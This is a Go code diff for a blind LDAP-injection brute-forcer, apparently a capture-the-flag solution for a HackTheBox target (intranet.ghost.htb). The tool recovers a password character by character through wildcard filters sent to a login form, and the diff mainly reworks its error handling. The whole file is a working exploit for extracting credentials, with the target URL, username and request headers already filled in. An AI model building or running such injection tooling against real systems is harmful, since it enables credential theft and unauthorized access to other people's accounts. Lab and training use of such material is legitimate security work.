@@ -1,6 +1,7 @@
 package main
 
 import (
+	"errors"
 	"fmt"
 	"strconv"
 )
@@ -21,55 +22,65 @@ func NewLdapInjector(client Injector) *LdapInjector {
 
 // Test if a character (plus whatever was validated before it) is valid
 func (li *LdapInjector) TestCharacter(prefix string) (string, error) {
+	var passErr *PasswordError
 	for _, c := range li.Charset {
-		if ok, err := li.Client.Do(fmt.Sprintf("%s%s*", prefix, string(c))); err != nil {
-			return "", err
-		} else if ok {
+		if err := li.Client.Do(fmt.Sprintf("%s%s*", prefix, string(c))); err == nil {
 			return string(c), nil
+		} else if !errors.As(err, &passErr) {
+			return "", err
 		}
 	}
 
-	return "", nil
+	return "", NewPasswordError(fmt.Errorf("exhausted character set"))
 }
 
 // Go through each character and save positive results
 func (li *LdapInjector) Brute() (string, error) {
 	var result string
+	var passErr *PasswordError
 	for {
 		c, err := li.TestCharacter(result)
 		if err != nil {
-			return "", err
-		}
-		if c == "" {
-			if ok, err := li.Client.Do(result); err != nil {
+			if errors.As(err, &passErr) {
+				if err := li.Client.Do(result); err == nil {
+					break
+				} else if errors.As(err, &passErr) {
+					return result, fmt.Errorf("partial password found: %s", result)
+				} else {
+					return "", err
+				}
+			} else {
 				return "", err
-			} else if !ok {
-				return "", fmt.Errorf("partial password found: %s", result)
 			}
-			break
 		}
 		result += c
 	}
+
 	return result, nil
 }
 
 // Eliminate from charset characters that are not in the password
 func (li *LdapInjector) PruneCharset() error {
 	var newCharset string
+	var passErr *PasswordError
 	for _, char := range li.Charset {
-		if ok, err := li.Client.Do(fmt.Sprintf("*%s*", string(char))); err != nil {
-			return err
-		} else if ok {
+		if err := li.Client.Do(fmt.Sprintf("*%s*", string(char))); err == nil {
 			newCharset += string(char)
+		} else {
+			if errors.As(err, &passErr) {
+				continue
+			}
+			return err
 		}
 	}
 	li.Charset = newCharset
+
 	return nil
 }
 
 // Interface so we don't need to hardcode the ldap type
 type Injector interface {
-	Do(password string) (bool, error)
+	Do(password string) error
 }
 
 func CreateCharset() string {
@@ -85,8 +96,7 @@ func CreateCharset() string {
 }
 
 func main() {
-
-	httpClient := NewFastHttpBruteImpl("POST", "http://intranet.ghost.htb:8008/login", "gitea_temp_principal", 303,
+	httpClient := NewHttpBruteImpl("POST", "http://intranet.ghost.htb:8008/login", "gitea_temp_principal", 303,
 		map[string]string{
 			"Content-Type": "application/x-www-form-urlencoded",
 			"Next-Action":  "c471eb076ccac91d6f828b671795550fd5925940",
@@ -105,4 +115,3 @@ func main() {
 	}
 	fmt.Println("Success! Password:", password)
 }
-
